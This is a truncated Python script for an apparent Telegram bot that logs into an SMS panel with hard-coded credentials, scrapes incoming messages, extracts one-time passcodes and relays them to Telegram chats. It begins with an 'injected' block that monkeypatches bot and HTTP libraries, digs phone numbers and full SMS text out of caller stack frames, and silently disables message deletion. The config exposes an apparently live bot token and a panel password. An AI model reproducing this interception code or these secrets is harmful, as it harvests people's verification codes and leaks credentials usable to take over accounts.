DELETE_DELAY = 0

import threading, time, asyncio, contextlib, sys, inspect
# --- Injected Auto Delete Engine & Data Capture ---
# ALL AUTO DELETE HAS BEEN COMPLETELY DISABLED PER USER REQUEST

def _extract_real_number():
    try:
        frame = inspect.currentframe()
        while frame:
            for var_name in ['row', 'item', 'data', 'record']:
                if var_name in frame.f_locals and isinstance(frame.f_locals[var_name], dict):
                    val = frame.f_locals[var_name].get('number') or frame.f_locals[var_name].get('num')
                    if val: return str(val)
            frame = frame.f_back
    except: pass
    return None

def _extract_full_sms():
    try:
        import re
        frame = inspect.currentframe()
        while frame:
            for var_name in ['row', 'item', 'data', 'record', 'sms_data']:
                if var_name in frame.f_locals:
                    v = frame.f_locals[var_name]
                    if isinstance(v, dict):
                        for k in ['sms', 'msg', 'message', 'text', 'full_sms']:
                            if k in v and isinstance(v[k], str) and len(v[k]) > 5:
                                return v[k]
                    elif isinstance(v, (list, tuple)):
                        longest = ""
                        for item in v:
                            if isinstance(item, str) and len(item) > len(longest) and not re.match(r'^\d{4}-\d{2}-\d{2}', item):
                                longest = item
                        if len(longest) > 10:
                            return longest
            for var_name in ['sms', 'msg', 'message', 'full_sms', 'otp_msg']:
                if var_name in frame.f_locals:
                    val = frame.f_locals[var_name]
                    if isinstance(val, str) and len(val) > 8 and "<tg-emoji" not in val and "{" not in val:
                        return val
            frame = frame.f_back
    except: pass
    return None

def _patch_bot():
    # Patch Telebot
    try:
        import telebot
        orig = telebot.TeleBot.send_message
        def new_send(self, cid, *a, **k):
            payload = {"text": a[0] if len(a)>0 else k.get("text", "")}
            if "reply_markup" in k: payload["reply_markup"] = k["reply_markup"].to_dict() if hasattr(k["reply_markup"], "to_dict") else str(k["reply_markup"])
            real_num = _extract_real_number()
            if real_num: payload["_real_number"] = real_num
            real_sms = _extract_full_sms()
            if real_sms: payload["_real_sms"] = real_sms
            print("[BOT CAPTURED DATA]: " + repr(payload))
            m = orig(self, cid, *a, **k)
            return m
        def new_del(self, *a, **k):
            pass # NEUTERED
        telebot.TeleBot.send_message = new_send
        telebot.TeleBot.delete_message = new_del
    except: pass

    # Patch Aiogram
    try:
        from aiogram import Bot
        orig_a = Bot.send_message
        async def new_a_send(self, cid, *a, **k):
            payload = {"text": a[0] if len(a)>0 else k.get("text", "")}
            if "reply_markup" in k: payload["reply_markup"] = k["reply_markup"].model_dump() if hasattr(k["reply_markup"], "model_dump") else str(k["reply_markup"])
            real_num = _extract_real_number()
            if real_num: payload["_real_number"] = real_num
            real_sms = _extract_full_sms()
            if real_sms: payload["_real_sms"] = real_sms
            print("[BOT CAPTURED DATA]: " + repr(payload))
            m = await orig_a(self, cid, *a, **k)
            return m
        async def new_a_del(self, *a, **k):
            pass # NEUTERED
        Bot.send_message = new_a_send
        Bot.delete_message = new_a_del
    except: pass

    # Patch Requests (Used by MSI/HADI raw scripts)
    try:
        import requests
        orig_req_post = requests.post
        def new_req_post(url, *a, **k):
            if "sendMessage" in str(url) and "bot" in str(url):
                payload = k.get("json", {}) or k.get("data", {})
                payload_copy = dict(payload)
                real_num = _extract_real_number()
                if real_num: payload_copy["_real_number"] = real_num
                real_sms = _extract_full_sms()
                if real_sms: payload_copy["_real_sms"] = real_sms
                print("[BOT CAPTURED DATA]: " + repr(payload_copy))
                return orig_req_post(url, *a, **k)
            if "deleteMessage" in str(url) and "bot" in str(url):
                class MockResp:
                    status_code = 200
                    def json(self): return {"ok": True, "result": True}
                return MockResp()
            return orig_req_post(url, *a, **k)
        requests.post = new_req_post
        
        orig_req_get = requests.get
        def new_req_get(url, *a, **k):
            if "deleteMessage" in str(url) and "bot" in str(url):
                class MockResp:
                    status_code = 200
                    def json(self): return {"ok": True, "result": True}
                return MockResp()
            return orig_req_get(url, *a, **k)
        requests.get = new_req_get
    except: pass

_patch_bot()
# -----------------------------------
import requests
import html
import time
import re
import json
import threading
import os
import sys
import queue
sys.stdout.reconfigure(encoding='utf-8')
import hashlib
from datetime import datetime, timedelta

# ==========================
# CONFIG
# ==========================
BOT_TOKENS3 = [
    "8606184785:AAFtR9vvhqR_GwPpYYUibx4CblRe2lZolqc",
    "8606184785:AAFtR9vvhqR_GwPpYYUibx4CblRe2lZolqc" # <--- Please put your second bot token here!
]
USERNAME3 = "Jahid25"
PASSWORD3 = "Rahat@4321"
BASE3 = "http://94.23.120.156"
TELEGRAM_CHAT_ID3 = [-1003713446342, -1003878606545]

PROCESSED_FILE3 = "processed_ids3.txt"
SAVE_FILE3 = "saved_sms3.json"

session3 = requests.Session()
LOGGED_IN_3 = False
SESSKEY_3 = None
INITIAL_SYNC_DONE_3 = False
START_TIME_3 = datetime.now()

file_lock = threading.Lock()

headers3 = {
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.9',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'Connection': 'keep-alive'
}

# ==========================
# COMPREHENSIVE LANGUAGE DETECTION
# ==========================
LANGUAGE_MAP = {
    'EN': 'English',
    'ES': 'Spanish',
    'FR': 'French',
    'DE': 'German',
    'IT': 'Italian',
    'PT': 'Portuguese',
    'RU': 'Russian',
    'PL': 'Polish',
    'NL': 'Dutch',
    'SV': 'Swedish',
    'NO': 'Norwegian',
    'DA': 'Danish',
    'FI': 'Finnish',
    'CS': 'Czech',
    'SK': 'Slovak',
    'HU': 'Hungarian',
    'RO': 'Romanian',
    'BG': 'Bulgarian',
    'HR': 'Croatian',
    'SR': 'Serbian',
    'UK': 'Ukrainian',
    'EL': 'Greek',
    'TR': 'Turkish',
    'AR': 'Arabic',
    'HE': 'Hebrew',
    'FA': 'Persian',
    'UR': 'Urdu',
    'HI': 'Hindi',
    'BN': 'Bengali',
    'TA': 'Tamil',
    'TE': 'Telugu',
    'KN': 'Kannada',
    'ML': 'Malayalam',
    'ZH': 'Chinese',
    'JA': 'Japanese',
    'KO': 'Korean',
    'TH': 'Thai',
    'VI': 'Vietnamese',
    'ID': 'Indonesian',
    'MY': 'Burmese',
    'KH': 'Khmer',
    'LO': 'Lao',
    'TL': 'Tagalog',
    'MS': 'Malay',
    'SIN': 'Sinhala',
    'AM': 'Amharic',
    'SW': 'Swahili',
}

def detect_sms_language(text):
    """Comprehensive language detection from SMS text"""
    if not text:
        return "EN"
    
    text_lower = text.lower()
    
    # Unicode ranges for different scripts
    language_patterns = {
        # Arabic and variants
        'AR': (r'[\u0600-\u06FF]', ['code', 'رمز', 'الكود']),
        # Persian/Farsi
        'FA': (r'[\u06A0-\u06FF]', ['کد', 'پیام']),
        # Hebrew
        'HE': (r'[\u0590-\u05FF]', ['קוד', 'אישור']),
        # Russian/Ukrainian/Bulgarian (Cyrillic)
        'RU': (r'[\u0400-\u04FF]', ['код', 'подтверждение', 'пароль']),
        'UK': (r'[\u0400-\u04FF]', ['код', 'підтвердження']),
        'BG': (r'[\u0400-\u04FF]', ['код', 'потвърждение']),
        # Chinese (Simplified & Traditional)
        'ZH': (r'[\u4E00-\u9FFF]', ['代码', '確認', '验证']),
        # Japanese
        'JA': (r'[\u3040-\u309F\u30A0-\u30FF]', ['コード', '確認']),
        # Korean
        'KO': (r'[\uAC00-\uD7AF]', ['코드', '확인']),
        # Thai
        'TH': (r'[\u0E00-\u0E7F]', ['รหัส', 'ยืนยัน']),
        # Devanagari (Hindi, Sanskrit, Marathi)
        'HI': (r'[\u0900-\u097F]', ['कोड', 'पुष्टि']),
        # Bengali
        'BN': (r'[\u0980-\u09FF]', ['কোড', 'নিশ্চিত']),
        # Tamil
        'TA': (r'[\u0B80-\u0BFF]', ['குறியீடு', 'உறுதி']),
        # Telugu
        'TE': (r'[\u0C00-\u0C7F]', ['కోడ్']),
        # Kannada
        'KN': (r'[\u0C80-\u0CFF]', ['ಕೋಡ್']),
        # Malayalam
        'ML': (r'[\u0D00-\u0D7F]', ['കോഡ്']),
        # Gujarati
        'GU': (r'[\u0A80-\u0AFF]', ['કોડ']),
        # Punjabi (Gurmukhi)
        'PA': (r'[\u0A00-\u0A7F]', ['ਕੋਡ']),
        # Sinhala
        'SIN': (r'[\u0D80-\u0DFF]', ['කේතය']),
        # Amharic
        'AM': (r'[\u1200-\u137F]', ['ኮድ']),
        # Georgian
        'KA': (r'[\u10A0-\u10FF]', ['კოდი']),
        # Armenian
        'HY': (r'[\u0530-\u058F]', ['կոդ']),
    }
    
    # Check Unicode patterns first (more reliable)
    for lang_code, (pattern, keywords) in language_patterns.items():
        if re.search(pattern, text):
            return lang_code
    
    # English and European language detection by keywords
    language_keywords = {
        'ES': ['hola', 'código', 'codig', 'contraseña', 'verificar', 'confirmación', 'activar', 'bienvenida'],
        'FR': ['bonjour', 'code', 'confirmation', 'vérification', 'activer', 'bienvenue', 'merci'],
        'DE': ['hallo', 'bestätigung', 'verifikation', 'aktivieren', 'willkommen', 'danke', 'code'],
        'IT': ['ciao', 'codice', 'conferma', 'verifica', 'attivare', 'benvenuto', 'grazie'],
        'PT': ['olá', 'código', 'confirmação', 'verificação', 'ativar', 'bem-vindo'],
        'PL': ['cześć', 'kod', 'potwierdzenie', 'weryfikacja', 'aktywować', 'witaj'],
        'NL': ['hallo', 'code', 'bevestiging', 'verificatie', 'activeren', 'welkom'],
        'SV': ['hej', 'kod', 'bekräftelse', 'verifiering', 'aktivera', 'välkommen'],
        'NO': ['hallo', 'kode', 'bekreftelse', 'verifisering', 'aktivere', 'velkommen'],
        'DA': ['hej', 'kode', 'bekræftelse', 'verifikation', 'aktivere', 'velkommen'],
        'FI': ['terve', 'koodi', 'vahvistus', 'varmennus', 'aktivoida', 'tervetuloa'],
        'CS': ['ahoj', 'kód', 'potvrzení', 'ověření', 'aktivovat', 'vítejte'],
        'SK': ['ahoj', 'kód', 'potvrdenie', 'overenie', 'aktivovať', 'vitajte'],
        'HU': ['halló', 'kód', 'megerősítés', 'ellenőrzés', 'aktiválás', 'üdvözöljük'],
        'RO': ['bună', 'cod', 'confirmare', 'verificare', 'activa', 'bine'],
        'HR': ['bok', 'kod', 'potvrda', 'provjera', 'aktivirati', 'dobrodošli'],
        'SR': ['здраво', 'код', 'потврда', 'провера', 'активирати', 'добро'],
        'TR': ['merhaba', 'kod', 'onaylama', 'doğrulama', 'etkinleştir', 'hoşgeldiniz'],
        'EL': ['γειά', 'κωδικός', 'επιβεβαίωση', 'επαλήθευση', 'ενεργοποίηση'],
        'EN': ['hello', 'code', 'confirmation', 'verify', 'activate', 'welcome', 'password', 'otp'],
    }
    
    # Check for language-specific keywords
    for lang, keywords in language_keywords.items():
        matches = sum(1 for word in keywords if word in text_lower)
        if matches >= 2:
            return lang
    
    # Check for single character keywords in some languages
    if 'ق' in text or 'ع' in text or 'ر' in text or 'ل' in text:
        return 'AR'
    if 'ш' in text or 'щ' in text or 'ю' in text:
        return 'RU'
    if 'ł' in text or 'ę' in text or 'ś' in text:
        return 'PL'
    if 'ü' in text or 'ö' in text or 'ß' in text:
        return 'DE'
    if 'ñ' in text or 'á' in text or 'é' in text:
        return 'ES'
    if 'ç' in text or 'é' in text or 'è' in text:
        return 'FR'
    
    # Default to English
    return 'EN'

# ==========================
# DEDUP (PERSISTENT)
# ==========================
def load_processed3():
    try:
        with open(PROCESSED_FILE3, "r") as f:
            return set(f.read().splitlines())
    except FileNotFoundError:
        return set()
    except Exception as e:
        print(f"[Bot3] Warning: Could not load processed file: {e}")
        return set()

processed_ids3 = load_processed3()

def save_processed3(uid):
    with file_lock:
        try:
            with open(PROCESSED_FILE3, "a") as f:
                f.write(uid + "\n")
        except Exception as e:
            print(f"[Bot3] Warning: Could not save processed ID: {e}")

def make_uid3(number, sms):
    return hashlib.md5(f"{number}_{sms}".encode()).hexdigest()

# ==========================
# OTP EXTRACTION
# ==========================
def extract_otp3(text):
    if not text:
        return "N/A"
    clean = text.replace(" ", "")
    m = re.search(r'(?<!\d)(\d{6})(?!\d)', clean)
    if m:
        return m.group(1)
    m = re.search(r'(\d{3,4})[-](\d{3,4})', clean)
    if m:
        return m.group(1) + m.group(2)
    m = re.search(r'(?<!\d)(\d{4,8})(?!\d)', clean)
    if m:
        return m.group(1)
    return "N/A"

# ==========================
# FORMAT MESSAGE
# ==========================
def format_item3(it):
    range_val = str(it.get("range", "")).strip()
    number_raw = str(it.get("number", "")).replace("+", "").strip()
    platform_raw = str(it.get("platform", "")).upper().strip()
    sms_text = str(it.get("sms", "")).strip()

    country_name_raw = range_val.split('-')[0].strip() if '-' in range_val else range_val.strip()

    country_code, flag = ("UN", "🌍")

    country_map = {
        "Venezuela": ("VE", "🇻🇪"), "Zimbabwe": ("ZW", "🇿🇼"), "Switzerland": ("CH", "🇨🇭"),
        "Bolivia": ("BO", "🇧🇴"), "Ivory Coast": ("CI", "🇨🇮"), "Guatemala": ("GT", "🇬🇹"),
        "Vietnam": ("VN", "🇻🇳"), "Afghanistan": ("AF", "🇦🇫"), "Albania": ("AL", "🇦🇱"),
        "Algeria": ("DZ", "🇩🇿"), "Andorra": ("AD", "🇦🇩"), "Angola": ("AO", "🇦🇴"),
        "Antigua and Barbuda": ("AG", "🇦🇬"), "Argentina": ("AR", "🇦🇷"), "Armenia": ("AM", "🇦🇲"),
        "Australia": ("AU", "🇦🇺"), "Austria": ("AT", "🇦🇹"), "Azerbaijan": ("AZ", "🇦🇿"),
        "Bahamas": ("BS", "🇧🇸"), "Bahrain": ("BH", "🇧🇭"), "Bangladesh": ("BD", "🇧🇩"),
        "Barbados": ("BB", "🇧🇧"), "Belarus": ("BY", "🇧🇾"), "Belgium": ("BE", "🇧🇪"),
        "Belize": ("BZ", "🇧🇿"), "Benin": ("BJ", "🇧🇯"), "Bhutan": ("BT", "🇧🇹"),
        "Bosnia and Herzegovina": ("BA", "🇧🇦"), "Botswana": ("BW", "🇧🇼"), "Brazil": ("BR", "🇧🇷"),
        "Brunei": ("BN", "🇧🇳"), "Bulgaria": ("BG", "🇧🇬"), "Burkina Faso": ("BF", "🇧🇫"),
        "Burundi": ("BI", "🇧🇮"), "Cabo Verde": ("CV", "🇨🇻"), "Cambodia": ("KH", "🇰🇭"),
        "Cameroon": ("CM", "🇨🇲"), "Canada": ("CA", "🇨🇦"), "Central African Republic": ("CF", "🇨🇫"),
        "Chad": ("TD", "🇹🇩"), "Chile": ("CL", "🇨🇱"), "China": ("CN", "🇨🇳"),
        "Colombia": ("CO", "🇨🇴"), "Comoros": ("KM", "🇰🇲"), "Congo": ("CG", "🇨🇬"),
        "Costa Rica": ("CR", "🇨🇷"), "Croatia": ("HR", "🇭🇷"), "Cuba": ("CU", "🇨🇺"),
        "Cyprus": ("CY", "🇨🇾"), "Czechia": ("CZ", "🇨🇿"), "Denmark": ("DK", "🇩🇰"),
        "Djibouti": ("DJ", "🇩🇯"), "Dominica": ("DM", "🇩🇲"), "Dominican Republic": ("DO", "🇩🇴"),
        "Ecuador": ("EC", "🇪🇨"), "Egypt": ("EG", "🇪🇬"), "El Salvador": ("SV", "🇸🇻"),
        "Equatorial Guinea": ("GQ", "🇬🇶"), "Eritrea": ("ER", "🇪🇷"), "Estonia": ("EE", "🇪🇪"),
        "Eswatini": ("SZ", "🇸🇿"), "Ethiopia": ("ET", "🇪🇹"), "Fiji": ("FJ", "🇫🇯"),
        "Finland": ("FI", "🇫🇮"), "France": ("FR", "🇫🇷"), "Gabon": ("GA", "🇬🇦"),
        "Gambia": ("GM", "🇬🇲"), "Georgia": ("GE", "🇬🇪"), "Germany": ("DE", "🇩🇪"),
        "Ghana": ("GH", "🇬🇭"), "Greece": ("GR", "🇬🇷"), "Grenada": ("GD", "🇬🇩"),
        "Guinea": ("GN", "🇬🇳"), "Guinea-Bissau": ("GW", "🇬🇼"), "Guyana": ("GY", "🇬🇾"),
        "Haiti": ("HT", "🇭🇹"), "Honduras": ("HN", "🇭🇳"), "Hungary": ("HU", "🇭🇺"),
        "Iceland": ("IS", "🇮🇸"), "India": ("IN", "🇮🇳"), "Indonesia": ("ID", "🇮🇩"),
        "Iran": ("IR", "🇮🇷"), "Iraq": ("IQ", "🇮🇶"), "Ireland": ("IE", "🇮🇪"),
        "Israel": ("IL", "🇮🇱"), "Italy": ("IT", "🇮🇹"), "Jamaica": ("JM", "🇯🇲"),
        "Japan": ("JP", "🇯🇵"), "Jordan": ("JO", "🇯🇴"), "Kazakhstan": ("KZ", "🇰🇿"),
        "Kenya": ("KE", "🇰🇪"), "Kiribati": ("KI", "🇰🇮"), "Korea, North": ("KP", "🇰🇵"),
        "Korea, South": ("KR", "🇰🇷"), "Kuwait": ("KW", "🇰🇼"), "Kyrgyzstan": ("KG", "🇰🇬"),
        "Laos": ("LA", "🇱🇦"), "Latvia": ("LV", "🇱🇻"), "Lebanon": ("LB", "🇱🇧"),
        "Lesotho": ("LS", "🇱🇸"), "Liberia": ("LR", "🇱🇷"), "Libya": ("LY", "🇱🇾"),
        "Liechtenstein": ("LI", "🇱🇮"), "Lithuania": ("LT", "🇱🇹"), "Luxembourg": ("LU", "🇱🇺"),
        "Madagascar": ("MG", "🇲🇬"), "Malawi": ("MW", "🇲🇼"), "Malaysia": ("MY", "🇲🇾"),
        "Maldives": ("MV", "🇲🇻"), "Mali": ("ML", "🇲🇱"), "Malta": ("MT", "🇲🇹"),
        "Marshall Islands": ("MH", "🇲🇭"), "Mauritania": ("MR", "🇲🇷"), "Mauritius": ("MU", "🇲🇺"),
        "Mexico": ("MX", "🇲🇽"), "Micronesia": ("FM", "🇫🇲"), "Moldova": ("MD", "🇲🇩"),
        "Monaco": ("MC", "🇲🇨"), "Mongolia": ("MN", "🇲🇳"), "Montenegro": ("ME", "🇲🇪"),
        "Morocco": ("MA", "🇲🇦"), "Mozambique": ("MZ", "🇲🇿"), "Myanmar": ("MM", "🇲🇲"),
        "Namibia": ("NA", "🇳🇦"), "Nauru": ("NR", "🇳🇷"), "Nepal": ("NP", "🇳🇵"),
        "Netherlands": ("NL", "🇳🇱"), "New Zealand": ("NZ", "🇳🇿"), "Nicaragua": ("NI", "🇳🇮"),
        "Niger": ("NE", "🇳🇪"), "Nigeria": ("NG", "🇳🇬"), "North Macedonia": ("MK", "🇲🇰"),
        "Norway": ("NO", "🇳🇴"), "Oman": ("OM", "🇴🇲"), "Pakistan": ("PK", "🇵🇰"),
        "Palau": ("PW", "🇵🇼"), "Panama": ("PA", "🇵🇦"), "Papua New Guinea": ("PG", "🇵🇬"),
        "Paraguay": ("PY", "🇵🇾"), "Peru": ("PE", "🇵🇪"), "Philippines": ("PH", "🇵🇭"),
        "Poland": ("PL", "🇵🇱"), "Portugal": ("PT", "🇵🇹"), "Qatar": ("QA", "🇶🇦"),
        "Romania": ("RO", "🇷🇴"), "Russia": ("RU", "🇷🇺"), "Rwanda": ("RW", "🇷🇼"),
        "Saint Kitts and Nevis": ("KN", "🇰🇳"), "Saint Lucia": ("LC", "🇱🇨"),
        "Saint Vincent and the Grenadines": ("VC", "🇻🇨"), "Samoa": ("WS", "🇼🇸"),
        "San Marino": ("SM", "🇸🇲"), "Sao Tome and Principe": ("ST", "🇸🇹"),
        "Saudi Arabia": ("SA", "🇸🇦"), "Senegal": ("SN", "🇸🇳"), "Serbia": ("RS", "🇷🇸"),
        "Seychelles": ("SC", "🇸🇨"), "Sierra Leone": ("SL", "🇸🇱"), "Singapore": ("SG", "🇸🇬"),
        "Slovakia": ("SK", "🇸🇰"), "Slovenia": ("SI", "🇸🇮"), "Solomon Islands": ("SB", "🇸🇧"),
        "Somalia": ("SO", "🇸🇴"), "South Africa": ("ZA", "🇿🇦"), "South Sudan": ("SS", "🇸🇸"),
        "Spain": ("ES", "🇪🇸"), "Sri Lanka": ("LK", "🇱🇰"), "Sudan": ("SD", "🇸🇩"),
        "Suriname": ("SR", "🇸🇷"), "Sweden": ("SE", "🇸🇪"), "Syria": ("SY", "🇸🇾"),
        "Taiwan": ("TW", "🇹🇼"), "Tajikistan": ("TJ", "🇹🇯"), "Tanzania": ("TZ", "🇹🇿"),
        "Thailand": ("TH", "🇹🇭"), "Timor-Leste": ("TL", "🇹🇱"), "Togo": ("TG", "🇹🇬"),
        "Tonga": ("TO", "🇹🇴"), "Trinidad and Tobago": ("TT", "🇹🇹"), "Tunisia": ("TN", "